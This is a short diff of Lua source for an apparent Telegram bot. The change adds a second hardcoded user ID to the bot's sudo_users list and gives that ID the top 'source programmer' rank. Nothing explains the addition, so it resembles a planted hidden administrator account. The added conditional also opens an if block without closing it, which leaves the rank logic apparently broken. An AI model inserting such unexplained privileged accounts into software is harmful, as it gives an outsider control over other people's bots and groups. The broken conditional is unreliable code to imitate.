@@ -172,7 +172,7 @@ end
 local api4 = '7'
 local api3 = '9443'
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-sudo_users = {SUDO,1360140225}   
+sudo_users = {SUDO,1360140225,1770288756}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -299,6 +299,8 @@ return var
 end 
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1360140225) then  
+var = ' مبرمج السورس'
+if tonumber(user_id) == tonumber(1770288756) then  
 var = ' مبرمج السورس'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
